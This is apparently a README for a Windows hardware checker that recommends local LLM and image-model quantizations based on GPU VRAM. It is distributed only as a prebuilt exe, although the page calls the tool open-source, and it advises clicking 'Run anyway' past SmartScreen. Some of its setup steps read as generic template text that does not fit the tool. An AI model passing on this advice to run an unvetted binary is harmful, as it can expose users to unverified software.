<p align="center">
  <img src="https://i.postimg.cc/fTJs1Smg/banner.png" alt="LocalAI Ready Check — Windows VRAM, CUDA & Model Quantization Advisor for Local AI" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Local%20AI%20Hardware%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-localai--check--v1.1-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# LocalAI Ready Check — Windows VRAM, CUDA & Model Quantization Advisor for Local AI

**Want to run Ollama, LM Studio, or ComfyUI locally on Windows, but unsure whether your 8 GB, 12 GB, or 16 GB GPU will run 8B/14B/32B LLMs or Flux/SDXL image models without crashing out-of-VRAM? Audit your hardware in 2 seconds.**

LocalAI Ready Check inspects your GPU compute stack, dedicated VRAM, system RAM, and SSD free space on Windows: **recommending the exact GGUF quantization (`Q4_K_M`, `Q8_0`) and image diffusion precision (`FP16`, `FP8`, `NF4`) that fit cleanly inside your GPU memory**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC users** getting started with local LLMs and image generation (Ollama, LM Studio, ComfyUI, KoboldCpp) without downloading 20 GB models only to hit OOM errors.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Downloaded a 16 GB LLM that runs at 1 token/sec due to RAM offload | Model + KV context cache exceeded physical GPU VRAM | Match model parameter count (`7B` / `14B` / `32B`) to your exact VRAM |
| ComfyUI throws `CUDA out of memory` on Flux or SDXL workflows | Running full `FP16` weights on an 8 GB or 12 GB graphics card | Use recommended `FP8` / `GGUF Q4` quantized weights and tiled VAE |
| Unsure whether CUDA drivers, Git, or Python are already installed | Missing prerequisites cause cryptic setup errors | Verify NVIDIA driver CUDA version, Vulkan support, and free SSD space |
| System drive `C:` runs out of space while downloading models | Ollama and HuggingFace cache default to `%USERPROFILE%` on `C:` | Check `C:` vs. secondary NVMe free space before downloading weights |

## Download for Windows

[**Download LocalAICheck.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/LocalAICheck.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `LocalAICheck.exe`? (Key features)

- Detects GPU model, dedicated VRAM (`GB`), driver version, supported **CUDA** / **Vulkan** compute level, and CPU **AVX2/AVX-512** support.
- Calculates safe VRAM budgets for **LLMs (Ollama / LM Studio)** across `7B/8B`, `14B`, `32B`, and `70B` GGUF quantizations.
- Recommends optimal **ComfyUI / Stable Diffusion / Flux** precision (`FP16`, `FP8`, `NF4`) for your exact VRAM tier.
- Checks free disk space on `C:` and secondary drives and verifies existing `Git`, `Python`, and `Ollama` installations.

### Sample Output

```text
[LocalAICheck] Auditing Windows GPU, CUDA & Memory for Local AI...
[OK]   GPU & VRAM       : NVIDIA GeForce RTX 4070 SUPER (12.0 GB Dedicated VRAM)
[OK]   Compute Stack    : CUDA 12.6 Supported | System RAM: 32.0 GB | CPU: AVX2 OK
[INFO] Recommended LLM  : 8B (Q8_0 / FP16) or 14B (Q4_K_M ~9.2 GB VRAM — Fast!)
[INFO] Image Gen Fit    : Flux.1 Dev (FP8 / Q4 GGUF) & SDXL (FP16) — Full GPU Fit
```

The release ZIP is named `LocalAICheck.zip`; the Windows executable inside is named `LocalAICheck.exe`.

1. Close LocalAI Check before updating or replacing executable files.
2. Click **Download LocalAICheck.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `LocalAICheck.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with NVIDIA, AMD, or Intel Arc graphics (or CPU-only mode).

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `LocalAICheck.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Preventing wasted bandwidth on oversized model downloads

Know before downloading whether a 14B or 32B GGUF model will fit entirely in VRAM or spill into slow system RAM.

### Clear quantization guidance (`Q4_K_M` vs `Q8_0` vs `FP8`)

Translates raw gigabytes of VRAM into practical model recommendations.

### Checking `C:` drive space for HuggingFace & Ollama caches

Warns early if `%USERPROFILE%\.ollama` or `.cache\huggingface` will fill your boot SSD.

### 100% portable offline diagnostics

No Python or CUDA toolkit installation required to run the hardware check.

## Default folders and configuration paths

LocalAI Check inspects standard Windows hardware interfaces and common local AI cache paths:

```text
%USERPROFILE%\.ollama\models\
```

Typical directory layout:

```text
Local AI Cache & Environment Paths Checked:
├── GPU / VRAM / CUDA / Vulkan (WMI & Driver Query)
├── %USERPROFILE%\.ollama\models
├── %USERPROFILE%\.cache\huggingface\hub
└── Git / Python / Ollama PATH availability
```

If `C:` is low on space, set the `OLLAMA_MODELS` or `HF_HOME` Windows environment variable to a secondary NVMe drive before downloading large models.

## Quick start guide

Follow these steps to get started:

1. **Extract `LocalAICheck.zip` and run `LocalAICheck.exe`.** No installation or internet connection required.
2. **Review your GPU's dedicated VRAM and CUDA/Vulkan status.** Check the recommended LLM (`GGUF`) and Image (`FP8`/`FP16`) tiers.
3. **Verify free SSD space on `C:` and secondary drives.** Move model cache variables to a larger SSD if `C:` has under 40 GB free.
4. **Click **Copy Hardware Summary** if asking for workflow recommendations.** Ready to use with Ollama, LM Studio, or ComfyUI.

### Data safety note

LocalAI Check runs strictly in read-only mode without modifying drivers or environment variables.

## What the status summary shows

LocalAI Check displays **GPU model, VRAM GB, CUDA/Vulkan version, system RAM, CPU instruction sets, and recommended GGUF/FP8 model sizes**.

## FAQ

**Can I run local LLMs on an 8 GB VRAM graphics card?**

Yes—7B and 8B models quantized to `Q4_K_M` (~5.5 GB VRAM) run very fast on 8 GB GPUs.

**Does LocalAI Check download models or install Python?**

No. It is a lightweight hardware readiness checker that tells you what your PC can run before you install anything.

**Does it detect AMD Radeon and Intel Arc GPUs?**

Yes—it reports VRAM and Vulkan/DirectML readiness across NVIDIA, AMD, and Intel GPUs.

## Useful reading

- [Ollama Official Documentation](https://github.com/ollama/ollama)
- [ComfyUI Official Repository](https://github.com/comfyanonymous/ComfyUI)

## More Windows Desktop Utilities

- [WhisperDesk-OfflineTranscriber](../WhisperDesk-OfflineTranscriber) — Local offline speech-to-text & SRT subtitle generator
- [ImgUpscale-LocalESRGAN](../ImgUpscale-LocalESRGAN) — Offline 2x & 4x AI image upscaler for photos & anime
- [CleanCut-OfflineBgRemover](../CleanCut-OfflineBgRemover) — Offline batch image background remover & PNG cutout tool
- [DriveHealth-NVMeSmartCheck](../DriveHealth-NVMeSmartCheck) — Portable NVMe & SSD SMART health, TBW & temp checker

*Independent open-source desktop utility for Windows.*
